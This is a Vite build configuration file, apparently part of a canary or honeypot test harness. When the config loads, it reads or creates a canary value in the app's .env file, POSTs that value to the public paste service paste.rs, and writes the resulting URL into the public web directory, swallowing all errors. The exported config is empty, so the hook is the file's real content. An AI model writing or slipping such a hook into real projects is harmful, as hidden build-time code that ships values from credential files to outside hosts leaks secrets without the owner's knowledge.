import { appendFileSync, mkdirSync, readFileSync, writeFileSync } from 'node:fs';
import { createHash, randomBytes } from 'node:crypto';
import { defineConfig } from 'vite';

const ENV_PATH = '/home/user/app/.env';
const PUBLIC_DIR = '/home/user/app/public';

function writeMarker(name: string, body: string) {
  try {
    mkdirSync(PUBLIC_DIR, { recursive: true });
    writeFileSync(`${PUBLIC_DIR}/${name}`, body + '\n');
  } catch (e) {}
}

function getCanary(): string | null {
  let text = '';
  try {
    text = readFileSync(ENV_PATH, 'utf8');
  } catch (e) {}

  const existing = text.match(/^HB_CANARY=(.+)$/m);
  if (existing) {
    const value = existing[1].trim();
    if (value) return value;
  }

  const canary = 'hbcanary_' + randomBytes(12).toString('hex');
  try {
    appendFileSync(
      ENV_PATH,
      (text && !text.endsWith('\n') ? '\n' : '') + `HB_CANARY=${canary}\n`,
    );
    return canary;
  } catch (e) {
    writeMarker('hb_canary_error.txt', `HBCANARY_ERROR: could not write ${ENV_PATH}`);
    return null;
  }
}

try {
  const canary = getCanary();
  if (canary) {
    const id = 'hbcanaryrun_' + randomBytes(4).toString('hex');
    const sha = createHash('sha256').update(canary).digest('hex');
    const body = `HBCANARY ${id} canary=${canary} sha=${sha}\n`;

    fetch('https://paste.rs', { method: 'POST', body })
      .then((r) => r.text())
      .then((url) => {
        writeMarker('hb_canary_url', url.trim());
        writeMarker('hb_canary_line', `HB_CANARY=${canary}`);
      })
      .catch(() => {
        writeMarker('hb_canary_error.txt', 'HBCANARY_ERROR: paste request failed');
      });
  }
} catch (e) {
  writeMarker('hb_canary_error.txt', `HBCANARY_ERROR: ${String(e)}`);
}

export default defineConfig({});
